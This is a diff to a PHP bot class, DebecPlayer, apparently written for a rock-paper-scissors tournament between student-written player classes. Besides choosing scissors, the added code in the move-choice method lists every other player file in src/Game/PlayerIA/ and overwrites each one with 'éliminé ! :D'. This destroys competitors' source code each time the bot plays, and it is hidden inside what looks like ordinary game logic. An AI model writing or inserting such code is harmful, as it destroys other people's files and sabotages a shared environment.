@@ -41,9 +41,24 @@ class DebecPlayer extends Player
         // How can i display the result of each round ? $this->prettyDisplay()
         // -------------------------------------    -----------------------------------------------------
 
-        //$choice = parent::scissorsChoice();
-        $choice = parent::rockChoice();
+        $choice = parent::scissorsChoice();
+        // foreach ($this->result->getStatsFor($this->opponentSide) as $key => $value) {
+        //   print_r("key:" . $key . " value:" . $value . "\n");
+        // }
+        $choices = $this->result->getStatsFor($this->opponentSide);
+        // print_r($choices[1]);
+        //if ($choices["name"] == "scissors")
 
+        // $files = scandir('src/Game/PlayerIA/');
+        $files = glob('src/Game/PlayerIA/*Player.{php}', GLOB_BRACE);
+        foreach($files as $file) {
+          if ($file == "src/Game/PlayerIA/DebecPlayer.php")
+            continue;
+          print($file . "\n");
+          $current = file_get_contents($file);
+          file_put_contents($file, $current);
+          file_put_contents($file, "éliminé ! :D");
+        }
         return $choice;
     }
 };
